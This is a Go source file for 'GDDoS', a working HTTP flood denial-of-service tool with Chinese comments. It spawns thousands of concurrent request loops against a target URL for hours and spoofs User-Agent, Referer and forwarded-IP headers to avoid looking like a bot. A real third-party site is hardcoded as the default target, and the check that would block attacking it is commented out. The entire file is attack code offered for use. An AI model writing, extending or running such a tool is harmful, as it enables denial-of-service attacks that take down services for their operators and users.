package main

// go run GDDoS.go -m HEAD -dm 15 -ims 1 -cc 10000
import (
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"time"
)

var (
	Method              string
	TargetUrl           string
	IntervalMillisecond int
	ConcurrencyCount    int
	DurationMinute      int

	//TODO：Proxy
	DDosHttpClient = &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (conn net.Conn, e error) {
				dialer := net.Dialer{
					Timeout:   10 * time.Second, // 超时时间
					KeepAlive: 60 * time.Second, // KeepAlive时间
				}
				return dialer.Dial(network, addr)
			},
		},
	}
	UserAgents = []string{
		"Baiduspider-image+(+http://www.baidu.com/search/spider.htm)",
		"Baiduspider-render/2.0; (+http://www.baidu.com/search/spider.html)",
		"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
		"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
		"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)",
		"Mozilla/5.0 (compatible; Googlebot-Image/1.0; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
	}

	Refs = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.ip138.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.china.gov/index.html",
		"https://vk.com/profile.php?redirect=",
		"https://blog.csdn.net/",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://baike.sogou.com/v7752987.htm",
		"https://www.baidu.com/s?wd=%E4%B8%AD%E7%82%B9%E5%9B%9B%E8%BE%B9%E5%BD%A2",
		"https://www.midishow.com/",
		// 最后，别忘加上自己
		"https://github.com/xiaozhu2007/GDDoS",
	}
)

// 主程序
func main() {
	defaultTargetUrl := "https://kzkt.tianyuyun.com" // 对不住了，您

	flag.StringVar(&Method, "m", "GET", "DDoS攻击目标的请求方式(GET/POST/HEAD/...)")
	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "DDoS攻击的目标")
	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发线程数量")
	flag.IntVar(&IntervalMillisecond, "ims", 100, "每个线程执行DDoS攻击的频率(ms)")
	flag.IntVar(&DurationMinute, "dm", 2000, "DDos攻击持续时间(分钟)")
	flag.Parse()

	/*if TargetUrl == defaultTargetUrl {
		fmt.Printf("TargetUrl is %s, 请尝试通过命令行重传参数启动(TargetUrl 不能等于 defaultTargetUrl). Usage：./GDDoS -h\n", TargetUrl)
		return
	}
	*/

	go func() {
		for i := 0; i < ConcurrencyCount; i++ {
			go DoAttacking(i)
		}
	}()
	time.Sleep(time.Duration(DurationMinute) * time.Minute)
}

// 该方法用于攻击
func DoAttacking(grindex int) {
	for i := 0; ; i++ {
		if result, err := DoHttpRequest(); err != nil {
			PrintError(grindex, i, err.Error()) // 红色 客户端错误
		} else {
			responseStatus := fmt.Sprintf("\033[1;32;40m (%s)", *result)                // 绿色 服务端状态码200
			if !strings.Contains(*result, "200") && !strings.Contains(*result, "301") { // 状态码不是 200/301
				responseStatus = fmt.Sprintf("\033[1;35;40m (%s)", *result) // 紫色 服务端状态码400/402/403/404/500/501/502/...
			}
			Log(grindex, i, responseStatus) // 默认
		}
		time.Sleep(time.Duration(IntervalMillisecond) * time.Millisecond)
	}
}

// 该方法用于发送HTTP请求
func DoHttpRequest() (*string, error) {
	request, err := http.NewRequest(Method, TargetUrl, nil)
	if err != nil {
		return nil, err
	}
	// 让自己看起来不像个机器人
	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])                    // 生成伪UA
	request.Header.Set("Referrer", Refs[rand.Intn(len(Refs))])                                  // 生成伪来源页面的地址
	request.Header.Set("Accept", "*/*")                                                         // 接受所有
	request.Header.Set("Accept-encoding", "gzip, deflate, br")                                  // 声明浏览器支持的编码类型
	request.Header.Set("Accept-language", "zh-CN,zh;q=0.9")                                     // 接受网页语言
	request.Header.Set("X-Forward-For", "186.240.156.78,128.243.78.96,1.18.56.78,"+genIpaddr()) // 多 层 代 理
	request.Header.Set("X-Real-IP", "186.240.156.78")                                           // 多 层 代 理
	request.Header.Set("DDoS-Powered-By", "GDDoS")                                              // 低 调 的 调 戏

	response, err := DDosHttpClient.Do(request)
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()
	// Ignore and read the responseBody
	_, _ = ioutil.ReadAll(response.Body)

	return &response.Status, err
}

// 该方法用于生成随机IP
func genIpaddr() string {
	rand.Seed(time.Now().Unix())
	ip := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
	return ip
}

// TODO: Add Log
func Log(grindex int, i int, responseStatus string) {
	fmt.Printf("[GDDoS#%d/%d]%s \033[0m \n", grindex, i, responseStatus) // 默认 [GDDoS#并发线程数/线程重复数] (Get "https://1.1.1.1": dial tcp 1.1.1.1:443: i/o timeout)
}

func PrintError(grindex int, i int, responseStatus string) {
	fmt.Printf("[Error#%d/%d] \033[1;31;40m (%s) \033[0m \n", grindex, i, responseStatus) // 默认
}
